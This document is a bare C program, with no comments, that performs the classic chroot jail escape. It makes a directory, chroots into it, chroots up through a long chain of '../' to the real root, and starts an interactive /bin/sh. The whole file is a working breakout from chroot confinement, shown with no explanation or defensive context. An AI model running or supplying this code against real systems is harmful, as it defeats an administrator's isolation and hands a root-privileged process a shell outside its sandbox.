#include <sys/stat.h>
#include <unistd.h>

int main() {
    mkdir(".42", 0755);
    chroot(".42");
    chroot("../../../../../../../../../../../../../../../..");
    return execl("/bin/sh", "-i", NULL);
}
